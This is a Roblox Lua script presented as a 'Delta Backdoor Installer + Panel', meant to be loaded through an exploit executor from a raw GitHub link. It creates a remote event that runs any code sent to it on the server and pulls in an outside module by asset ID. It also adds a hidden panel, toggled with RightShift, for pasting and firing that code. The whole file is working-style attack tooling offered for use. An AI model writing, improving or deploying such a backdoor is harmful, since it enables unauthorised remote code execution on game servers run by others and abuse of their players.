-- Delta Backdoor Installer + Panel
-- Put this on GitHub raw and load with: loadstring(game:HttpGet("YOUR_RAW_LINK"))()

print("🔥 Delta Backdoor Installer Loading...")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Create Backdoor Remote
local backdoor = ReplicatedStorage:FindFirstChild("DeltaBD") or Instance.new("RemoteEvent")
backdoor.Name = "DeltaBD"
backdoor.Parent = ReplicatedStorage

-- Server Handler
backdoor.OnServerEvent:Connect(function(plr, mode, code)
    if mode == "execute" and code then
        print(plr.Name .. " executed via Delta Backdoor")
        local success, err = pcall(function()
            loadstring(code)()
        end)
        if not success then warn(err) end
    elseif mode == "demogorgon" then
        require(90079465185110).load(plr.Name)
    end
end)

print("✅ Backdoor Installed Successfully!")

-- GUI Panel
local screenGui = Instance.new("ScreenGui")
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 450, 0, 400)
frame.Position = UDim2.new(0.5, -225, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
frame.Visible = false
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,50)
title.BackgroundColor3 = Color3.fromRGB(200, 0, 50)
title.Text = "DELTA SERVER BACKDOOR"
title.TextScaled = true
title.Parent = frame

local textbox = Instance.new("TextBox")
textbox.Size = UDim2.new(1,-20,0,150)
textbox.Position = UDim2.new(0,10,0,60)
textbox.BackgroundColor3 = Color3.fromRGB(30,30,30)
textbox.Text = "-- Paste code here"
textbox.TextWrapped = true
textbox.Parent = frame

local execBtn = Instance.new("TextButton")
execBtn.Size = UDim2.new(0.48,0,0,50)
execBtn.Position = UDim2.new(0,10,0,220)
execBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
execBtn.Text = "EXECUTE SERVER"
execBtn.TextScaled = true
execBtn.Parent = frame

local demoBtn = Instance.new("TextButton")
demoBtn.Size = UDim2.new(0.48,0,0,50)
demoBtn.Position = UDim2.new(0.5,0,0,220)
demoBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 255)
demoBtn.Text = "LOAD DEMOGORGON"
demoBtn.TextScaled = true
demoBtn.Parent = frame

-- Toggle with RightShift
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.RightShift then
        frame.Visible = not frame.Visible
    end
end)

execBtn.MouseButton1Click:Connect(function()
    backdoor:FireServer("execute", textbox.Text)
end)

demoBtn.MouseButton1Click:Connect(function()
    backdoor:FireServer("demogorgon")
end)

print("Panel loaded. Press RightShift to open.")
